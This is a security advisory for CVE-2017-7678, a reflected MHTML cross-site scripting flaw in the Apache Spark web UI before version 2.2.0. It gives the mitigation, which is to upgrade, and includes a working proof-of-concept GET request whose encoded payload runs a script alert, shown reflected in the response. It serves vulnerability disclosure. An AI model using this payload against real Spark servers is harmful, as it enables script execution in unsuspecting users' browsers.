Subject: CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability

Severity: Low

Vendor: The Apache Software Foundation

Versions Affected:
Versions of Apache Spark before 2.2.0

Description:
It is possible for an attacker to take advantage of a user's trust in the
server to trick them into visiting a link that points to a shared Spark
cluster and submits data including MHTML to the Spark master, or history
server. This data, which could contain a script, would then be reflected
back to the user and could be evaluated and executed by MS Windows-based
clients. It is not an attack on Spark itself, but on the user, who may then
execute the script inadvertently when viewing elements of the Spark web UIs.

Mitigation:
Update to Apache Spark 2.2.0 or later.

Example:
Request:
GET
/app/?appId=Content-Type:%20multipart/related;%20boundary=_AppScan%0d%0a--
_AppScan%0d%0aContent-Location:foo%0d%0aContent-Transfer-
Encoding:base64%0d%0a%0d%0aPGh0bWw%2bPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw%2b%0d%0a
HTTP/1.1

Excerpt from response:
<div class="row-fluid">No running application with ID Content-Type:
multipart/related;
boundary=_AppScan
--_AppScan
Content-Location:foo
Content-Transfer-Encoding:base64
PGh0bWw+PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw+
</div>

Result: In the above payload the BASE64 data decodes as:
<html><script>alert("XSS")</script></html>
